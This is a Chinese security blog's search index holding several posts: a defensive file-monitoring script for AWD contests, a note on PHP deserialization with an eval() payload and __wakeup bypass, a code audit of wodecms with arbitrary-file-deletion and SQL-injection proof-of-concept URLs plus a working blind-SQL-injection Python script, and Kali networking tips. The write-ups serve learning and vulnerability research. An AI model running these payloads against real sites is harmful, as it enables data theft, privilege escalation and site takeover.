    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>分享一个文件监控的小脚本</p><a id="more"></a><h2 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h2><p>以前在打AWD的时候，需要一个好一点的文件监控脚本，但网上找的都不是很好用，于是自己写了一个小脚本</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre><code>#!/usr/bin/python3# *_* coding: utf-8 *_*import osimport shutilimport timefrom pyinotify import WatchManager, Notifier, ProcessEvent, IN_DELETE, IN_CREATE, IN_MODIFY, IN_OPEN, IN_ACCESS, IN_ATTRIBclass Events(ProcessEvent):    def process_IN_CREATE(self, event):        if(event.dir != True):            print(&quot;[&quot;+(time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;,time.localtime(time.time())))+&quot;]&quot;,end=&#39; &#39;)            print(&quot;[Maskname]: Create | [Name]: &quot;+event.name+&quot; | [Path]: &quot;+event.path+&quot; | [Pathname]: &quot;+event.pathname)            if os.path.splitext(event.name)[-1] == &quot;.php&quot;:                os.unlink(event.pathname)                print(&quot;Successful deal the php file!&quot;)    def process_IN_DELETE(self, event):        if(event.dir != True):            print(&quot;[&quot;+(time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;,time.localtime(time.time())))+&quot;]&quot;,end=&#39; &#39;)            print(&quot;[Maskname]: Delete | [Name]: &quot;+event.name+&quot; | [Path]: &quot;+event.path+&quot; | [Pathname]: &quot;+event.pathname)            if os.path.splitext(event.name)[-1] != &quot;.php&quot;:                try:                    shutil.copyfile((pathbak + event.name), (event.path+&quot;/&quot;+event.name))                    print(&quot;Successful restore file!&quot;)                except:                    pass    def process_IN_MODIFY(self, event):        if(event.dir != True):            print(&quot;[&quot;+(time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;,time.localtime(time.time())))+&quot;]&quot;,end=&#39; &#39;)            print(&quot;[Maskname]: Change | [Name]: &quot;+event.name+&quot; | [Path]: &quot;+event.path+&quot; | [Pathname]: &quot;+event.pathname)    def process_IN_ACCESS(self, event):        if(event.dir != True):            print(&quot;[&quot;+(time.strftime(&#39;%Y-%m-%d %H:%M:%S&#39;,time.localtime(time.time())))+&quot;]&quot;,end=&#39; &#39;)            print(&quot;[Maskname]: Access | [Name]: &quot;+event.name+&quot; | [Path]: &quot;+event.path+&quot; | [Pathname]: &quot;+event.pathname)            if event.name in importence:                print(&quot;Notice!!! Importent file was accessed!!!&quot;)def myinotify(path):    wm = WatchManager()    mask = IN_DELETE | IN_CREATE | IN_MODIFY | IN_OPEN | IN_ACCESS | IN_ATTRIB    wm.add_watch(path, mask, auto_add=True, rec=False)    myevent = Events()    notifier = Notifier(wm, myevent)    notifier.loop()if __name__ == &quot;__main__&quot;:    path = [&#39;/var/www/html/q/&#39;]    pathbak = &#39;/var/www/html/q.bak/&#39;    importence = [&#39;flag.php&#39;,&#39;flag&#39;]    myinotify(path)</code></pre><h2 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h2><p>这个小脚本是对pyinotify模块的一次升级改造，主要分为以下功能</p><ul><li>增：现实情况下，文件增添一般是攻击者通过web漏洞写了木马。在此处，脚本对所有的增添文件进行监控，并自行删除所有新增的php文件</li><li>删：碰到删除，在我的映像中，好像就是删除install.lock文件对web服务进行重装以达到入侵目的。此脚本可以监控所有的删除文件，并在之前设置好的备份目录里恢复所有非php文件。</li><li>查：一般情况就是入侵者通过web漏洞对文件进行读取。一般来说，读取的都是重要的文件，如：config.php、database.php等等，也有可能是直接读取放在web目录下的flag。脚本在这里可以监控所有的文件读取记录，并设置重要目录importence关键词，若读取到关键词里的文件，即可发出重要提示，也可以避免文件访问过多漏过重要文件被读取的信息。</li><li>改：针对所有的文件修改信息发出提醒</li></ul><h2 id="本地测试效果图"><a href="#本地测试效果图" class="headerlink" title="本地测试效果图"></a>本地测试效果图</h2><p>本地测试命令<br><img src="/images/myinotify1.png" alt=""></p><p>效果图<br><img src="/images/myinotify2.png" alt=""></p><p>可以看见install.lock文件并未被删除<br><img src="/images/myinotify3.png" alt=""></p><h2 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h2><p>本来我的设想中，会有文件修改之后会自动恢复的这一功能，但是在实际情况下，脚本中的增添删除功能和修改恢复功能起了冲突。并且在增添监控功能中，我的设想仅删除写入的木马。但是在实际情况下，web服务会创建临时session文件，脚本也会对进行误伤。同时删除监控和增添监控在功能上存在相悖的地方。<br>这是我在这个脚本上遇到的小问题，目前来说，我的解决方法就只有关闭rec参数，分几个脚本对重要目录进行监控。但这样又有悖我的精简性原则。。。。。<br>先把问题写下来，希望以后自己技术提升，能有所解决吧！</p>]]></content>
    
    
    <categories>
      
      <category>工具开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>反序列化小记</title>
    <link href="/2019/01/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E8%AE%B0/"/>
    <url>/2019/01/27/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%8F%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近看文章看到了php反序列化漏洞，感觉内容有点多，凭脑子一时记不下来，留点文字辅助记忆</p><a id="more"></a><h2 id="魔法方法造成的php反序列化漏洞"><a href="#魔法方法造成的php反序列化漏洞" class="headerlink" title="魔法方法造成的php反序列化漏洞"></a>魔法方法造成的php反序列化漏洞</h2><p>先来几个魔法方法</p><ul><li>__construct():当一个类被创建时自动调用</li><li>__destruct():当一个类被销毁时自动调用</li><li>__sleep():当调用serialize()函数时自动调用</li><li>__wakeup():当调用unserialize()函数时自动调用</li><li>__toString():当类被当成字符串时自动调用</li></ul><p>当我们反序列化一个对象时，unserialize()会检测是否存在__wakeup()。如果存在，会优先进行调用</p><p>如：</p><pre><code>&lt;?phpclass A{    public $a = &#39;hello world&#39;;    function __wakeup()    {        echo &quot;hello world!!!&quot;;    }}$aaa = new A();$sss = serialize($aaa);$ddd = unserialize($sss);?&gt;</code></pre><p>执行结果：</p><p><img src="/images/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-1.png" alt="php反序列化-1"></p><p>可见，加入说__wakeup()里存在某些危险函数，我们便可以加以利用</p><p>如：</p><pre><code>&lt;?phpclass A{    var $a = &#39;echo &quot;hello world&quot;;&#39;;    function __wakeup()    {        eval($this-&gt;a);    }}$ddd = unserialize($_GET[&#39;str&#39;]);?&gt;</code></pre><p>在这个例子中，对GET进来的str变量进行反序列化。此时，魔法方法中存在eval()危险函数，我们可以控制传入的序列化字符串，进行触发，如：</p><p><code>O:1:&quot;A&quot;:1:{s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;}</code></p><p>执行结果：</p><p><img src="/images/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-2.png" alt="php反序列化-2"></p><p>由此可见，只要发现魔法方法里面存在某些危险函数，我们可以通过精心构造，达到利用。</p><h2 id="魔法方法绕过"><a href="#魔法方法绕过" class="headerlink" title="魔法方法绕过"></a>魔法方法绕过</h2><p>绕过前提：</p><ul><li>PHP5&lt; 5.6.25</li><li>PHP7&lt; 7.0.10</li></ul><p>先来点序列化字符串基础</p><p><code>O:1:&quot;A&quot;:1:{s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;}</code></p><p>花括号前：</p><ul><li>O：表示结构类型为类</li><li>1：表示类长度为1</li><li>A：表示类名为A</li><li>1：表示成员个数为1</li></ul><p>花括号内：</p><ul><li>s：属性名类型为str</li><li>1：长度为1</li><li>a：名称为a</li><li>10：长度为10</li><li>phpinfo();：内容为phpinfo();</li></ul><p>绕过本质：</p><p><strong>当序列化字符串表示对象属性大于真实的属性个数时会跳过__wakeup()方法</strong></p><p>那么，在下面的代码中，我们便可以进行利用：</p><pre><code>&lt;?phpclass A{    var $a = &#39;echo &quot;hello world&quot;;&#39;;    function __wakeup()    {        $this-&gt;a = &#39;echo &quot;hello world&quot;;&#39;;    }    function __destruct()    {        eval($this-&gt;a);    }}$ddd = unserialize($_GET[&#39;str&#39;]);?&gt;</code></pre><p>代码中反序列化的时候，调用__wakeup()方法对$a进行重新复制，使得我们无法利用eval()。但我们构造如下payload：</p><p><code>O:1:&quot;A&quot;:2:{s:1:&quot;a&quot;;s:10:&quot;phpinfo();&quot;;}</code></p><p>对__wakeup()进行绕过，触发成功：</p><p><img src="/images/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-3.png" alt="php反序列化-3"></p><h2 id="某些比较好的链接"><a href="#某些比较好的链接" class="headerlink" title="某些比较好的链接"></a>某些比较好的链接</h2><p><a href="http://liehu.tass.com.cn/archives/1159" target="_blank" rel="noopener">http://liehu.tass.com.cn/archives/1159</a></p>]]></content>
    
    
    <categories>
      
      <category>Web安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计 - wodecms</title>
    <link href="/2018/11/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms/"/>
    <url>/2018/11/08/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近找了款小众cms进行代码审计</p><a id="more"></a><h2 id="路由规则"><a href="#路由规则" class="headerlink" title="路由规则"></a>路由规则</h2><p>由于第一次审计代码，也是依照网上的一些经验来进行入手，同时也参考了《代码审计·企业级web代码安全架构》这一本书。我是先对代码的路由规则进行理清，在通过自动化工具进行扫描验证。</p><p>cms入口文件分别是index.php和admin.php，分别是通过以下代码进行实例化运行的：<br>index.php：</p><blockquote><p>$control = new Controller();<br>$conrol-&gt;Run();  </p></blockquote><p>admin.php:  </p><blockquote><p>$conrol = new Controller();<br>$conrol-&gt;conrol = “admin”;<br>$conrol-&gt;Run();  </p></blockquote><p>相关的配置文件则是通过Init.php和setup.php进行调用：</p><blockquote><p>require ROOT_PATH.”/WODECMS/Init.php”<br>require(App_PATH.”setup.php”)</p></blockquote><p>跟进调用文件，发现Controller类于Init.php进行调用</p><blockquote><p>require ROOT_PATH.’/WODECMS/core/controller.class.php’</p></blockquote><p>进入controer.class.php文件,找到了入口函数Run()  </p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-07_22-30-10.png" alt=""></p><p>这里又调用了Analysis()函数，继续跟进：</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-07_22-32-29.png" alt=""></p><p>这里可以看见，对$_GET[‘ac’]传入的数据进行了处理，并将值传给了$modelClass和$controlClass.</p><p>继续跟进下半部分：</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-07_22-36-39.png" alt=""></p><p>这里c [‘URL_MODE’]是__construct()中的内容，旨在提供不同的模式。</p><p>继续向下看，$_GET[‘ac’]参数控制的值先是传入$_GET[‘C’]和$_[‘a’]，再传入$ac[0]和$ac[1]</p><p>最后对index和admin权限进行了一波判读按。</p><p>然后回到Run()函数：</p><p>$ac[0]和$ac[1]的值分别进入$this-&gt;control和$this-&gt;action.</p><p>注意这里的一次包含：</p><blockquote><p>$controlFile = ROOT_PATH . ‘/‘ . APP_PATH . “/“ . GROUP_DIR . “/“ . $this-&gt;control . ‘.class.php’;<br>include ($controlFile);</p></blockquote><p>这是根据$this-&gt;control和GROUP_DIR决定引入文件，GROUP_DIR是根据入口文件是index.php和admin.php来决定的。我们查看这两个文件夹：</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_12-33-14.png" alt=""></p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_12-33-26.png" alt=""></p><p>发现里面存放的是相应的模块文件。</p><p>继续下行，发现了最为核心的控制：</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_12-35-36.png" alt=""></p><p>分析代码，我们便可以得知，引入的方法模块通过<code>$instance-&gt;$mothodName()</code>来进行调用</p><p>至此，大致的逻辑就出来了，整站分别通过index.php和admin.php为入口，通过GET参数ac对方法进行调用，其中a为模块文件，c为模块方法</p><h2 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h2><h3 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h3><p>漏洞点：</p><blockquote><p>/app/admin/kindeditor.class.php</p><blockquote><p>function delete()<br>/app/admin/picture.class.php<br>function delete()<br>/app/admin/download.class.php<br>function deletePic()<br>/app/controller/kindeditor.class.php<br>function delete()<br>/app/controller/picture.class.php<br>function deletePic()  </p></blockquote></blockquote><p>这套cms的任意删除文件出发点有点多！！！</p><p>我这里以<code>/app/controller/picture.class.php</code>为例：</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_13-21-26.png" alt=""></p><p><code>$path = ROOT_PATH.$_GET[&#39;pic&#39;]</code><br><code>unlink($path)</code></p><p><strong>根本没有任何防备。。。。</strong></p><p>这里ROOT_PATH的值为网站根目录地址<br>直接构造POC：<br><code>http://127.0.0.1/index.php?ac=picture_delete&amp;pic=/1.txt</code></p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_13-31-15.png" alt=""></p><p>POC验证：</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_13-32-19.png" alt=""></p><p>回看文件夹：</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_13-32-55.png" alt=""></p><p>这里可以对任意文件删除，如可以尝试删除install.lock文件，对网站进行重装</p><p>正常状况下：</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_14-10-04.png" alt=""></p><p>通过构造POC删除app/date/install.lock文件</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_14-12-16.png" alt=""></p><p>再次访问，即可进行重装</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_14-12-54.png" alt=""></p><h3 id="权限越过-amp-sql注入"><a href="#权限越过-amp-sql注入" class="headerlink" title="权限越过&amp;sql注入"></a>权限越过&amp;sql注入</h3><p>漏洞点位于文件<code>/app/controller/video.class.php</code>的loading()函数</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_14-43-36.png" alt=""></p><p>在此处的sql语句 <code>&quot;UPDATE tc_user SET money =&quot;.$num.&quot; WHERE id = &quot;.$uid</code><br>对于$uid仅仅只有全局过滤而在此处没有任何过滤且此处为数字型注入<br>这意味着只要过了全局过滤，在此处可以随意注入</p><p>首先，此sql语句操作的是tc_user表的money数据，emmmm，算是比较重要的敏感数据，根据查找，在<code>index.php?ac=user_home</code>里对此数据进行了调用：<br><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_14-41-01.png" alt=""></p><p>这里的积分就是money数据，我们构造POC对积分尝试操作：<br><code>http://127.0.0.1/index.php?ac=video_loading&amp;money=111&amp;uid=2</code>(这里的uid为当前用户id)</p><p>前台数据已被修改：</p><p><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_14-46-08.png" alt=""></p><p>这里的money数据为敏感数据，前台用户通过调用模块方法进行修改，属于垂直越权。<br>继续深入：</p><p>根据代码逻辑，这里的sql语句执行结果并未返回，但是在此处并没有回显<br><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_14-48-54.png" alt=""><br>但是代码的执行与否却会影响user_home的积分值，我们通过对比<code>user_home</code>界面，得出语句的正确与否.<br>这里我写了个小脚本：</p><pre><code>#!/usr/bin/python3# *_* coding: utf-8 *_*import requestsfrom bs4 import BeautifulSoup as bsfurl_payload = &#39;http://127.0.0.1/index.php?ac=video_loading&amp;money=110&amp;uid=1 &#39;url_reset = &#39;http://127.0.0.1/index.php?ac=video_loading&amp;money=100&amp;uid=1&#39;urlcheck = &#39;http://127.0.0.1/index.php?ac=user_home&#39;length = 0flag = 100database = &#39;&#39;cookies = {&#39;PHPSESSID&#39;: &#39;qsmsrleeo6ro1j3ivlq1jv1g94&#39;} #PHPSESSID 值需要自己进行修改database_length = &#39;and 1=(length(datababasese())=&#39;+str(length)+&#39;)&#39;database_payload = &#39;and 1=(ascii(substr(database() from 1))=119)&#39;def sql_start(url):    try:        r = requests.get(url= url, cookies= cookies)        status = r.status_code    except Exception as e:        print(&#39;[*] connect error!&#39;)        print(e)def check(url):    try:        r = requests.get(url= url, cookies= cookies)        html = r.text        soup = bsf(html, &#39;lxml&#39;)        result = soup.find_all(&#39;div&#39;, class_=&#39;personal-information&#39;)        final = result[0].ul        if str(flag) not in str(final):            return 1        else:            return 0    except Exception as e:        print(&#39;[*] connect error!&#39;)        print(e)def restart(url):    try:        r = requests.get(url= url, cookies= cookies)    except Exception as e:        print(e)def database_len():    global length    restart(url_reset)    for i in range(1, 20):        url = url_payload+&#39;and 1=(length(datababasese())=&#39;+str(i)+&#39;)&#39;        print(&#39;[-] Testing: &#39;, url)        sql_start(url)        if check(urlcheck):            print(&quot;[+] The database&#39;s length is &quot;, i)            length = i            return 0        else:            print(&#39;[*] filed&#39;)#database_len()def database_sql():    global database    result = &#39;&#39;    for i in range(1, length+1):        restart(url_reset)        for j in range(1, 128):            url = url_payload+&#39;and 1=(ascii(substr(datababasese() from &#39;+str(i)+&#39;))=&#39;+str(j)+&#39;)&#39;            print(&#39;[-] Testing &#39;, url)            sql_start(url)            if check(urlcheck):                print(&#39;[+] succees !&#39;)                result = result+chr(j)                break            else:                print(&#39;[*] filed&#39;)        print(&#39;result is&#39;, result)    database = resultdatabase_len()database_sql()print(database)</code></pre><p>PS：此处只对数据库进行注入，未尝试更多，但原理一样，仅需更改payload即可.</p><p>但有些时候，我们并不知道uid的值，那么此处通过<code>user_home</code>进行判断就不可取，那么就可以用时间盲注构造POC：<br><code>http://127.0.0.1/index.php?ac=video_loading&amp;money=111&amp;uid=2 and (0=(select case when (ascii(substring((database()) from 1 for 1 ))=119) then sleep(4) else 0 end))</code><br>(此处对参数全局过滤了逗号，且对database()中的base进行了一次替换)<br>我们查看POC验证情况：<br><img src="/images/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E4%B9%8Bwodecms-Snipaste_2018-11-08_15-11-30.png" alt=""><br>成功验证.</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这个cms比较小众，也没有做较多的防御。而且当中有很多方法都是写出来但并没有对方法进行调用，所以就没有找到更危险的漏洞（也是我太菜的缘故）。但也算是大致知道代码审计的基本流程和方法，结果还算是好的。<br>再接再励！</p>]]></content>
    
    
    <categories>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WODECMS</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>解决kali虚拟机网络问题</title>
    <link href="/2018/09/16/%E8%A7%A3%E5%86%B3kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/"/>
    <url>/2018/09/16/%E8%A7%A3%E5%86%B3kali%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BD%91%E7%BB%9C%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>  虚拟机装的kali，但我的kali貌似和我命里犯冲，网络总是出问题。以前总是遇到才百度，很是麻烦。现在打算一次性解决所有隐患。</p><a id="more"></a><h2 id="检查网卡"><a href="#检查网卡" class="headerlink" title="检查网卡"></a>检查网卡</h2><p>假设我们用eth0网卡上网，我们用ip命令检测网卡状态：<br><code>ip link ls eth0</code><br>如果是网卡未启动，则显示如下：</p><p><img src="/images/snip_20180913133856.png" alt="enter description here"><br>通过以下命令启动网卡：<br><code>ip link set eth0 up</code><br>或者<br><code>ifup eth0</code><br>启动成功，则显示如下：<br><img src="/images/snip_20180913134309.png" alt="enter description here"></p><h2 id="检测IP地址"><a href="#检测IP地址" class="headerlink" title="检测IP地址"></a>检测IP地址</h2><p>网卡启动之后，依旧上不了网，运行<code>ifconfig</code>。一看，根本没有IP地址。。。<br><img src="/images/snip_20180913134550.png" alt="enter description here"><br>身为懒癌晚期，本着能简单绝不复杂的原则，当然是用DHCP获取动态IP：<br><code>dhclient -4 -v eth0</code><br>结果如下：<br><img src="/images/snip_20180913135222.png" alt="enter description here"><br>此时，电脑已经正常上网</p>]]></content>
    
    
    <categories>
      
      <category>Bug处理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>kali</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
